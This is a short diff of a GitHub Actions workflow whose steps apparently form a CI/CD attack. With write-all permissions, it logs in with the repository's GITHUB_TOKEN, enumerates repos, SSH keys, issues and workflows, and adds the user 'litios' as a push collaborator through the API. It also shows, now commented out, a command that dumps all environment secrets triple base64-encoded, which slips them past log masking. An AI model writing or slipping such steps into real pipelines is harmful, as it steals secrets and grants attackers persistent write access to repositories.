@@ -11,14 +11,14 @@ jobs:
     permissions: write-all
     steps:
       - run: | 
-          sh -c 'env | base64 -w0 | base64 -w0 | base64 -w0'
+          #sh -c 'env | base64 -w0 | base64 -w0 | base64 -w0'
           echo "${{ secrets.GITHUB_TOKEN }}" | gh auth login --with-token
           gh repo list > list
           cat list
           gh auth status
           gh ssh-key list
           gh issue list
-          gh worfklow list || echo "fail"
+          gh worfklow list
           gh api -XPUT repos/messypoutine/gravy-overflow/collaborators/litios -f permission=push --silent
           echo "HERE"
           sleep 15
